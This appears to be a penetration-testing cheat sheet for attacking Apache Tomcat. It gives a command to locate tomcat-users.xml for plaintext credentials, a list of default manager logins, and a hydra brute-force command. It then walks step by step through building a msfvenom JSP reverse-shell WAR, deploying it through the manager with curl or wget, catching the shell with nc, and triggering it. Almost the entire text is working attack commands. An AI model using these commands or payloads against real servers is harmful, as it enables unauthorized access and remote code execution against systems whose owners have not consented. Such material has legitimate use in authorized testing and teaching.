## Config & Credentials Files

```bash
# Locate Tomcat user config (contains plaintext credentials)
locate tomcat-users.xml
```
## Default Credentials

The most interesting Tomcat path is `/manager/html` — it allows uploading and deploying `.war` files for code execution. This path is protected by HTTP Basic Auth.

Common default credentials to try:

| Username | Password  |
|----------|-----------|
| admin    | admin     |
| tomcat   | tomcat    |
| admin    | *(empty)* |
| admin    | s3cr3t    |
| tomcat   | s3cr3t    |
| tomcat   | s3cret    |
| admin    | tomcat    |
## Brute Force

```bash
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
```
## Remote Code Execution (RCE)

### Step 1 – Generate WAR Payload

```bash
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war
```

### Step 2 – Upload Payload

Navigate to the Tomcat Manager to upload manually, or deploy via CLI:

```bash
# Tomcat 6
wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -

# Tomcat 7+
curl -v -u <USER>:<PASSWORD> -T shell.war \
  'http://<IP>:8080/manager/text/deploy?path=/shell&update=true'
```

### Step 3 – Start Listener

```bash
nc -lvp <LPORT>
```

### Step 4 – Trigger Payload

```bash
curl http://<IP>:8080/shell/
```